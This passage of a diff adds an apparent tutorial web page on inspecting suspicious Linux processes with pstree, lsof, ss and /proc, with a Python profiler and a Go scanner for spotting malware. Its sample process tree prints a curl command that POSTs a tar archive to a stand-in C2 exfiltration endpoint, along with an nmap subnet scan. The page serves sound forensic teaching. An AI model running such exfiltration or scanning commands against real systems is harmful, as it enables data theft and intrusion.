+suspicious.bin,12345 --daemon
+  ├─curl,12346 -s -X POST -d @/tmp/data.tar.gz http://c2/bot/exfil.php
+  ├─bash,12347 -c nmap -sS -p 22,80,443 192.168.1.0/24
+  │   └─nmap,12348 -sS -p 22,80,443 192.168.1.0/24
+  ├─{suspicious.bin},12349
+  └─{suspicious.bin},12350
+						</pre>
+						<p>
+							With
+							<code>-a</code>
+							(show arguments), the full commands appear: - curl POSTs a tar.gz to the
+							<abbr title="Command and Control">C2</abbr>
+							exfiltration endpoint. - bash runs nmap scanning the local subnet for
+							<abbr title="Secure Shell">SSH</abbr>
+							/
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							/
+							<abbr title="Hypertext Transfer Protocol Secure">HTTPS</abbr>
+							(lateral movement).
+						</p>
+						<h4 id="tophtop-live-monitoring">top/htop - Live Monitoring</h4>
+						<pre class="plaintext">
+$ top -p 12345
+						</pre>
+						<p>
+							Live view of
+							<abbr title="Central Processing Unit">CPU</abbr>
+							, memory, and uptime. For long-running malware,
+							observe: -
+							<abbr title="Central Processing Unit">CPU</abbr>
+							pattern: 100% constant = miner. Burst activity = periodic
+							beaconing or file scanning. - Memory growth over time: Data accumulation (stolen files, logs,
+							keylogged input). - PID changes: The process exits and respawns (watchdog mechanism).
+						</p>
+						<pre class="plaintext">
+$ htop -p 12345
+						</pre>
+						<p>
+							htop shows per-thread
+							<abbr title="Central Processing Unit">CPU</abbr>
+							and open file counts. Press
+							<code>l</code>
+							for lsof
+							integration - shows open files directly.
+						</p>
+						<h4 id="pgrep-pkill">pgrep / pkill</h4>
+						<pre class="plaintext">
+$ pgrep -f suspicious.bin
+12345
+$ pgrep -u root -f &#39;\.bin&#39;
+12345
+						</pre>
+						<p>
+							Find processes by pattern, user, parent, or session. Use
+							<code>pgrep -l</code>
+							for name output:
+						</p>
+						<pre class="plaintext">
+$ pgrep -l -u root -f &#39;/tmp/&#39;
+12345 miner
+						</pre>
+						<p>
+							A process named
+							<code>miner</code>
+							runs from
+							<code>/tmp/</code>
+							as root - immediate investigation required.
+						</p>
+						<h4 id="lsof-list-open-files">lsof - List Open Files</h4>
+						<pre class="plaintext">
+$ lsof -p 12345
+COMMAND     PID USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME
+suspiciou 12345 root  cwd       DIR   8,1     4096 1048577 /var/tmp/.cache
+suspiciou 12345 root  rtd       DIR   8,1     4096       2 /
+suspiciou 12345 root  txt       REG   8,1    45120  524289 /tmp/.hidden/miner (deleted)
+suspiciou 12345 root  mem       REG   8,1  2029248  131072 /usr/lib/libc.so.6
+suspiciou 12345 root    0u      CHR    1,3      0t0       4 /dev/null
+suspiciou 12345 root    1u      CHR    1,3      0t0       4 /dev/null
+suspiciou 12345 root    2u      CHR    1,3      0t0       4 /dev/null
+suspiciou 12345 root    3u     IPv4  123456      0t0     TCP 10.0.2.15:58667-&gt;12.34.56.78:8080 (ESTABLISHED)
+suspiciou 12345 root    4u      REG   8,1  1048576 1048578 /tmp/.exfil/data.tar.gz
+suspiciou 12345 root    5r      REG   8,1   128500 1050000 /home/user/Documents/report.pdf
+suspiciou 12345 root    6u     unix 0xffff9a0000000000 0t0 123459 /tmp/.hidden/control.sock type=STREAM
+						</pre>
+						<p>
+							Every open resource: - FD 3:
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							connection to
+							<abbr title="Command and Control">C2</abbr>
+							(12.34.56.78:8080). - FD 4: Exfiltration staging file (
+							<code>/tmp/.exfil/data.tar.gz</code>
+							), 1 MB written.
+							<ul>
+								<li>FD 5: User document opened for reading ( <code>report.pdf</code> ) - being stolen.</li>
+								<li>FD 6: Unix domain socket ( <code>/tmp/.hidden/control.sock</code> ) - inter-process communication with another malware component.</li>
+							</ul>
+						</p>
+						<p>Network-only view:</p>
+						<pre class="plaintext">
+$ lsof -i -a -p 12345
+COMMAND     PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+suspiciou 12345 root    3u  IPv4 123456      0t0  TCP 10.0.2.15:58667-&gt;c2-server.xyz:http-alt (ESTABLISHED)
+						</pre>
+						<p>User-level view:</p>
+						<pre class="plaintext">
+$ lsof -u root | grep -E &#39;/tmp/|/dev/shm|socket&#39;
+						</pre>
+						<p>
+							Find all suspicious files and sockets opened by root processes.
+							<code>/dev/shm</code>
+							and
+							<code>/tmp</code>
+							are common
+							malware staging areas.
+						</p>
+						<h4 id="ss-netstat-network-connections">ss / netstat - Network Connections</h4>
+						<pre class="plaintext">
+$ ss -tnp | grep 12345
+ESTAB  0  0  10.0.2.15:58667  12.34.56.78:8080  users:((&#34;suspicious.bi&#34;,pid=12345,fd=3))
+						</pre>
+						<p>
+							All
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							connections for the process.
+							<code>ss</code>
+							is faster than
+							<code>netstat</code>
+							(reads directly from netlink vs parsing
+							<code>/proc/net/tcp</code>
+							).
+						</p>
+						<p>Listening sockets:</p>
+						<pre class="plaintext">
+$ ss -tlnp | grep 12345
+LISTEN 0 128 0.0.0.0:8081 0.0.0.0:* users:((&#34;suspicious.bi&#34;,pid=12345,fd=4))
+						</pre>
+						<p>
+							The binary listens on port 8081 - an inbound
+							<abbr title="Command and Control">C2</abbr>
+							channel or backdoor service.
+						</p>
+						<p>
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							:
+						</p>
+						<pre class="plaintext">
+$ ss -unp | grep 12345
+UNCONN 0  0  0.0.0.0:53  0.0.0.0:* users:((&#34;suspicious.bi&#34;,pid=12345,fd=3))
+						</pre>
+						<p>
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							port 53 bound - the binary may be running its own
+							<abbr title="Domain Name System">DNS</abbr>
+							server for exfiltration or
+							<abbr title="Command and Control">C2</abbr>
+							resolution.
+						</p>
+					</section>
+					<section>
+						<h3 id="seccomp-mode">Seccomp Mode</h3>
+						<pre class="plaintext">
+$ cat /proc/12345/status | grep Seccomp
+Seccomp:        2
+Seccomp_filters:        1
+						</pre>
+						<ul>
+							<li><code>Seccomp: 0</code> : No seccomp. Normal process.</li>
+							<li><code>Seccomp: 1</code> : Seccomp strict mode (only <code>read</code> , <code>write</code> , <code>_exit</code> , <code>sigreturn</code> ). The binary severely restricts itself - unusual for malware, common for sandboxed processes.</li>
+							<li><code>Seccomp: 2</code> : Seccomp filter mode (BPF-based). The binary sets a custom filter. Malware can use this to restrict its own syscalls (defense evasion: avoid triggering seccomp-based <abbr title="Endpoint Detection and Response">EDR</abbr> ). Or it can be a sandboxed container process.</li>
+							<li><code>Seccomp_filters: N</code> : Number of seccomp filters attached. More than 1 means layered filtering - often from a container runtime (Docker/Podman).</li>
+						</ul>
+						<p>
+							Malware in a container with
+							<code>Seccomp: 2</code>
+							is container-aware: it knows it is restricted and may
+							attempt container escape.
+						</p>
+					</section>
+					<section>
+						<h3 id="cgroup-context">Cgroup Context</h3>
+						<pre class="plaintext">
+$ cat /proc/12345/cgroup
+0::/system.slice/containerd.service/123abc456def.scope
+						</pre>
+						<p>
+							The cgroup path reveals the container runtime.
+							<code>containerd</code>
+							,
+							<code>docker</code>
+							,
+							<code>podman</code>
+							,
+							<code>lxc</code>
+							-
+							each has distinct cgroup paths. Malware running in a container cgroup but accessing host files
+							(
+							<code>/proc/1/root/</code>
+							) is attempting container escape.
+						</p>
+						<pre class="plaintext">
+$ ls -la /proc/12345/root
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/12345/root -&gt; /
+						</pre>
+						<p>
+							If this symlink resolves to
+							<code>/</code>
+							(the host root), the process
+							<em>sees the host filesystem</em>
+							- not
+							a container filesystem. Compare with:
+						</p>
+						<pre class="plaintext">
+$ podman exec -it container_name ls -la /proc/1/root
+lrwxrwxrwx 1 root root 0 Jun 26 10:00 /proc/1/root -&gt; /var/lib/containers/storage/overlay/abc123/merged
+						</pre>
+						<p>Containerized processes have a root pointing to the overlay mount, not the host root.</p>
+					</section>
+					<section>
+						<h3 id="uid-and-capability-tracking">UID and Capability Tracking</h3>
+						<pre class="plaintext">
+$ cat /proc/12345/status | grep -E &#39;Uid|Gid|Cap&#39;
+Uid:    0       0       0       0
+Gid:    0       0       0       0
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 000001ffffffffff
+CapAmb: 0000000000000000
+						</pre>
+						<p>UID 0 = root. For a suspicious binary running as root, check capabilities:</p>
+						<ul>
+							<li><code>CapEff=0000000000000000</code> : No effective capabilities (but root has all by default unless dropped).</li>
+							<li><code>CapBnd=000001ffffffffff</code> : Full bounding set - all capabilities available.</li>
+							<li><code>CapPrm=0000000000000000</code> : Zero permitted caps - the binary dropped them.</li>
+						</ul>
+						<p>
+							If the binary runs as non-root but has
+							<code>CapEff</code>
+							with
+							<code>CAP_SYS_PTRACE</code>
+							(bit 19), it can ptrace
+							other processes - this is an injection mechanism.
+						</p>
+						<p>Decode capabilities:</p>
+						<pre class="plaintext">
+$ python3 -c &#34;
+caps = 0x000001ffffffffff
+map = {
+    0: &#39;CHOWN&#39;, 1: &#39;DAC_OVERRIDE&#39;, 2: &#39;DAC_READ_SEARCH&#39;,
+    3: &#39;FOWNER&#39;, 4: &#39;FSETID&#39;, 5: &#39;KILL&#39;,
+    6: &#39;SETGID&#39;, 7: &#39;SETUID&#39;, 8: &#39;SETPCAP&#39;,
+    9: &#39;LINUX_IMMUTABLE&#39;, 10: &#39;NET_BIND_SERVICE&#39;, 11: &#39;NET_BROADCAST&#39;,
+    12: &#39;NET_ADMIN&#39;, 13: &#39;NET_RAW&#39;, 14: &#39;IPC_LOCK&#39;,
+    15: &#39;IPC_OWNER&#39;, 16: &#39;SYS_MODULE&#39;, 17: &#39;SYS_RAWIO&#39;,
+    18: &#39;SYS_CHROOT&#39;, 19: &#39;SYS_PTRACE&#39;, 20: &#39;SYS_PACCT&#39;,
+    21: &#39;SYS_ADMIN&#39;, 22: &#39;SYS_BOOT&#39;, 23: &#39;SYS_NICE&#39;,
+    24: &#39;SYS_RESOURCE&#39;, 25: &#39;SYS_TIME&#39;, 26: &#39;SYS_TTY_CONFIG&#39;,
+    27: &#39;MKNOD&#39;, 28: &#39;LEASE&#39;, 29: &#39;AUDIT_WRITE&#39;,
+    30: &#39;AUDIT_CONTROL&#39;, 31: &#39;SETFCAP&#39;, 32: &#39;MAC_OVERRIDE&#39;,
+    33: &#39;MAC_ADMIN&#39;, 34: &#39;SYSLOG&#39;, 35: &#39;WAKE_ALARM&#39;,
+    36: &#39;BLOCK_SUSPEND&#39;, 37: &#39;AUDIT_READ&#39;,
+}
+for i in range(38):
+    if caps &amp; (1 &lt;&lt; i):
+        print(f&#39;  CAP_{map[i]}&#39;)
+&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="process-profiler-script">Process Profiler Script</h3>
+						<p>
+							Combine all
+							<code>/proc</code>
+							inspection into a single snapshot tool:
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+process_profiler.py -- snapshot a process and flag suspicious indicators
+Usage: python3 process_profiler.py &lt;PID&gt;
+&#34;&#34;&#34;
+import os
+import sys
+import socket
+import struct
+
+
+def hex_to_ip(hex_str: str) -&gt; str:
+    return socket.inet_ntoa(struct.pack(&#39;&lt;I&#39;, int(hex_str, 16)))
+
+
+def hex_to_port(hex_str: str) -&gt; int:
+    return int(hex_str, 16)
+
+
+def proc_read(path: str) -&gt; str:
+    try:
+        with open(path) as f:
+            return f.read().strip()
+    except (FileNotFoundError, PermissionError):
+        return &#39;&#39;
+
+
+def parse_status(pid: int) -&gt; dict:
+    status = {}
+    content = proc_read(f&#39;/proc/{pid}/status&#39;)
+    for line in content.splitlines():
+        if &#39;:&#39; in line:
+            key, val = line.split(&#39;:&#39;, 1)
+            status[key.strip()] = val.strip()
+    return status
+
+
+def parse_maps(pid: int) -&gt; list:
+    maps = []
+    content = proc_read(f&#39;/proc/{pid}/maps&#39;)
+    for line in content.splitlines():
+        if not line:
+            continue
+        parts = line.split()
+        if len(parts) &gt;= 5:
+            addr_range = parts[0]
+            perms = parts[1]
+            path = parts[-1] if len(parts) &gt; 5 else &#39;&#39;
+            maps.append({
+                &#39;range&#39;: addr_range,
+                &#39;perms&#39;: perms,
+                &#39;path&#39;: path,
+            })
+    return maps
+
+
+def parse_tcp(pid: int) -&gt; list:
+    connections = []
+    content = proc_read(f&#39;/proc/{pid}/net/tcp&#39;)
+    lines = content.splitlines()
+    if len(lines) &lt; 2:
+        return connections
+
+    for line in lines[1:]:
+        parts = line.split()
+        if len(parts) &lt; 8:
+            continue
+        local = parts[1].split(&#39;:&#39;)
+        remote = parts[2].split(&#39;:&#39;)
+        state = parts[3]
+        inode = parts[9]
+
+        try:
+            local_addr = hex_to_ip(local[0])
+            local_port = hex_to_port(local[1])
+            remote_addr = hex_to_ip(remote[0])
+            remote_port = hex_to_port(remote[1])
+        except Exception:
+            continue
+
+        connections.append({
+            &#39;local&#39;: f&#39;{local_addr}:{local_port}&#39;,
+            &#39;remote&#39;: f&#39;{remote_addr}:{remote_port}&#39;,
+            &#39;state&#39;: state,
+            &#39;inode&#39;: inode,
+        })
+    return connections
+
+
+def main():
+    if len(sys.argv) &lt; 2:
+        print(f&#34;Usage: {sys.argv[0]} &lt;PID&gt;&#34;)
+        sys.exit(1)
+
+    pid = int(sys.argv[1])
+
+    print(f&#34;{&#39;=&#39; * 60}&#34;)
+    print(f&#34;  PROCESS PROFILER - PID {pid}&#34;)
+    print(f&#34;{&#39;=&#39; * 60}&#34;)
+
+    # Basic info
+    cmdline = proc_read(f&#39;/proc/{pid}/cmdline&#39;).replace(&#39;\x00&#39;, &#39; &#39;)
+    exe = os.readlink(f&#39;/proc/{pid}/exe&#39;) if os.path.exists(f&#39;/proc/{pid}/exe&#39;) else &#39;N/A&#39;
+    cwd = os.readlink(f&#39;/proc/{pid}/cwd&#39;) if os.path.exists(f&#39;/proc/{pid}/cwd&#39;) else &#39;N/A&#39;
+
+    print(f&#34;\n  CMDLINE:  {cmdline or &#39;(empty/spoofed)&#39;}&#34;)
+    print(f&#34;  EXE:      {exe}&#34;)
+    print(f&#34;  CWD:      {cwd}&#34;)
+
+    # Status
+    status = parse_status(pid)
+    uid = status.get(&#39;Uid&#39;, &#39;&#39;).split()[0]
+    ppid = status.get(&#39;PPid&#39;, &#39;&#39;)
+    seccomp = status.get(&#39;Seccomp&#39;, &#39;&#39;)
+    threads = status.get(&#39;Threads&#39;, &#39;&#39;)
+    tracer = status.get(&#39;TracerPid&#39;, &#39;&#39;)
+
+    print(f&#34;\n  --- STATUS ---&#34;)
+    print(f&#34;  UID:       {uid}&#34;)
+    print(f&#34;  PPID:      {ppid}&#34;)
+    print(f&#34;  Threads:   {threads}&#34;)
+    print(f&#34;  TracerPID: {tracer}&#34;)
+    print(f&#34;  Seccomp:   {seccomp}&#34;)
+
+    # Suspicious flags
+    flags = []
+
+    # Deleted executable
+    if &#39;(deleted)&#39; in exe:
+        flags.append(f&#34;Executable deleted from disk: {exe}&#34;)
+
+    # RWX mappings
+    maps = parse_maps(pid)
+    rwx_maps = [m for m in maps if m[&#39;perms&#39;] == &#39;rwxp&#39; and &#39;anonymous&#39; in m[&#39;path&#39;]]
+    if rwx_maps:
+        for m in rwx_maps:
+            flags.append(f&#34;RWX anonymous mapping: {m[&#39;range&#39;]}&#34;)
+
+    # Run as root
+    if uid == &#39;0&#39;:
+        flags.append(&#34;Running as ROOT (UID 0)&#34;)
+
+    # Daemonized
+    if ppid == &#39;1&#39;:
+        flags.append(&#34;Daemonized: PPID=1 (parent exited, adopted by init)&#34;)
+
+    # Tracer
+    if tracer and tracer != &#39;0&#39;:
+        flags.append(f&#34;Being traced by PID {tracer}&#34;)
+
+    # High thread count
+    try:
+        if int(threads) &gt; 4:
+            flags.append(f&#34;High thread count: {threads}&#34;)
+    except ValueError:
+        pass
+
+    # Seccomp
+    if seccomp == &#39;2&#39;:
+        flags.append(f&#34;Seccomp filter mode active (sandboxed?)&#34;)
+
+    # Cgroup container check
+    cgroup = proc_read(f&#39;/proc/{pid}/cgroup&#39;)
+    container_runtimes = [&#39;docker&#39;, &#39;containerd&#39;, &#39;podman&#39;, &#39;lxc&#39;, &#39;kubepods&#39;]
+    for rt in container_runtimes:
+        if rt in cgroup:
+            flags.append(f&#34;Running in container ({rt} detected in cgroup)&#34;)
+            break
+
+    # Network connections
+    conns = parse_tcp(pid)
+    if conns:
+        print(f&#34;\n  --- NETWORK ({len(conns)} TCP connections) ---&#34;)
+        for c in conns:
+            print(f&#34;  {c[&#39;local&#39;]} -&gt; {c[&#39;remote&#39;]}  [{c[&#39;state&#39;]}]&#34;)
+        # Check for unusual ports
+        unusual_ports = [c for c in conns
+                         if hex_to_port(c[&#39;remote&#39;].split(&#39;:&#39;)[1]) not in {80, 443, 22, 53}]
+        if unusual_ports:
+            flags.append(f&#34;Connections on unusual ports: {len(unusual_ports)} found&#34;)
+
+    # Open FDs
+    try:
+        fds = os.listdir(f&#39;/proc/{pid}/fd&#39;)
+        print(f&#34;\n  --- FILE DESCRIPTORS ({len(fds)}) ---&#34;)
+        socket_fds = 0
+        for fd in fds[:30]:
+            try:
+                link = os.readlink(f&#39;/proc/{pid}/fd/{fd}&#39;)
+                if &#39;socket:&#39; in link:
+                    socket_fds += 1
+                if len(fds) &lt;= 20:
+                    print(f&#34;  fd {fd}: {link}&#34;)
+            except OSError:
+                pass
+        if socket_fds &gt; 0:
+            print(f&#34;  ... {socket_fds} socket FDs&#34;)
+        if len(fds) &gt; 30:
+            print(f&#34;  ... {len(fds) - 30} more FDs&#34;)
+    except PermissionError:
+        pass
+
+    # Flags summary
+    if flags:
+        print(f&#34;\n  --- SUSPICIOUS INDICATORS ---&#34;)
+        for f in flags:
+            print(f&#34;  [!] {f}&#34;)
+    else:
+        print(f&#34;\n  --- No suspicious indicators ---&#34;)
+
+    print(f&#34;{&#39;=&#39; * 60}&#34;)
+
+
+if __name__ == &#39;__main__&#39;:
+    main()
+						</pre>
+						<p>Usage:</p>
+						<pre class="plaintext">
+$ python3 process_profiler.py 12345
+============================================================
+  PROCESS PROFILER - PID 12345
+============================================================
+
+  CMDLINE:  [kworker/u8:2]
+  EXE:      /tmp/.hidden/miner (deleted)
+  CWD:      /var/tmp/.cache_3429
+
+  --- STATUS ---
+  UID:       0
+  PPID:      1
+  Threads:   5
+  TracerPID: 0
+  Seccomp:   0
+
+  --- NETWORK (2 TCP connections) ---
+  10.0.2.15:58667 -&gt; 12.34.56.78:8080  [01]
+
+  --- FILE DESCRIPTORS (12) ---
+  fd 0: /dev/null
+  fd 1: /dev/null
+  fd 2: /dev/null
+  fd 3: socket:[123456]
+  fd 4: /tmp/.exfil/data.tar.gz
+
+  --- SUSPICIOUS INDICATORS ---
+  [!] Executable deleted from disk: /tmp/.hidden/miner (deleted)
+  [!] Running as ROOT (UID 0)
+  [!] Daemonized: PPID=1 (parent exited, adopted by init)
+  [!] High thread count: 5
+  [!] Connections on unusual ports: 1 found
+============================================================
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go tool that scans every PID under
+							<code>/proc</code>
+							and prints the processes that look suspicious:
+							a deleted executable, an anonymous mapping with
+							<code>rwxp</code>
+							permissions, UID 0, or a parent that
+							is PID 1. Run it against a normal shell and then against a small test process that
+							<code>mmap</code>
+							s
+							an executable region, and compare the output.
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;bufio&#34;
+	&#34;fmt&#34;
+	&#34;os&#34;
+	&#34;path/filepath&#34;
+	&#34;strings&#34;
+)
+
+func readFile(path string) string {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return &#34;&#34;
+	}
+	return string(data)
+}
+
+func main() {
+	entries, err := filepath.Glob(&#34;/proc/[0-9]*&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+
+	for _, dir := range entries {
+		pid := filepath.Base(dir)
+		status := readFile(filepath.Join(dir, &#34;status&#34;))
+		if status == &#34;&#34; {
+			continue
+		}
+
+		var name, uid, ppid string
+		scanner := bufio.NewScanner(strings.NewReader(status))
+		for scanner.Scan() {
+			line := scanner.Text()
+			switch {
+			case strings.HasPrefix(line, &#34;Name:&#34;):
+				name = strings.TrimSpace(strings.TrimPrefix(line, &#34;Name:&#34;))
+			case strings.HasPrefix(line, &#34;Uid:&#34;):
+				fields := strings.Fields(line)
+				if len(fields) &gt; 1 {
+					uid = fields[1]
+				}
+			case strings.HasPrefix(line, &#34;PPid:&#34;):
+				ppid = strings.TrimSpace(strings.TrimPrefix(line, &#34;PPid:&#34;))
+			}
+		}
+
+		var flags []string
+
+		if target, err := os.Readlink(filepath.Join(dir, &#34;exe&#34;)); err == nil {
+			if strings.HasSuffix(target, &#34;(deleted)&#34;) {
+				flags = append(flags, &#34;deleted exe: &#34;+target)
+			}
+		}
+
+		for _, line := range strings.Split(readFile(filepath.Join(dir, &#34;maps&#34;)), &#34;\n&#34;) {
+			fields := strings.Fields(line)
+			if len(fields) &lt; 2 {
+				continue
+			}
+			if strings.HasPrefix(fields[1], &#34;rwxp&#34;) {
+				flags = append(flags, &#34;rwx mapping: &#34;+fields[0])
+			}
+		}
+
+		if uid == &#34;0&#34; {
+			flags = append(flags, &#34;running as uid 0&#34;)
+		}
+		if ppid == &#34;1&#34; {
+			flags = append(flags, &#34;parent is init&#34;)
+		}
+
+		if len(flags) &gt; 0 {
+			fmt.Printf(&#34;%s (%s) uid=%s ppid=%s\n&#34;, pid, name, uid, ppid)
+			for _, flag := range flags {
+				fmt.Printf(&#34;  [!] %s\n&#34;, flag)
+			}
+		}
+	}
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><code>man 5 proc</code> - complete <code>/proc</code> documentation</li>
+							<li><code>man 1 ps</code> , <code>man 1 top</code> , <code>man 1 htop</code></li>
+							<li><code>man 8 lsof</code> , <code>man 8 ss</code></li>
+							<li><code>man 1 pstree</code> , <code>man 1 pgrep</code></li>
+							<li>Linux kernel documentation: <code>Documentation/filesystems/proc.rst</code></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
